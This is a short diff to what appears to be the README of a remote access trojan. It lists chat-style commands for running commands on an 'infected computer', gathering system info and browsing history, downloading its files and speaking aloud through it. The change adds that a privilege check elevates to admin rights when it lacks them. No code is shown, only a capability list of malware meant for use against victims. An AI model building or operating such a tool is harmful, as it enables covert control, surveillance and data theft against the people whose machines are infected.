@@ -9,7 +9,7 @@ Availaible commands are :<br />
 --> !output = Execute a custom command that sends output<br />
 --> !custom = Execute a custom command that does not send any output<br />
 --> !voice = Make a voice say outloud a custom sentence<br />
---> !admincheck = Check if program has admin privileges<br />
+--> !admincheck = Check if program has admin privileges. If not, elevates.<br />
 --> !sysinfo = Gives info about infected computer<br />
 --> !history = Get infected computer navigation history<br />
 --> !download = Download a file from infected computer<br />
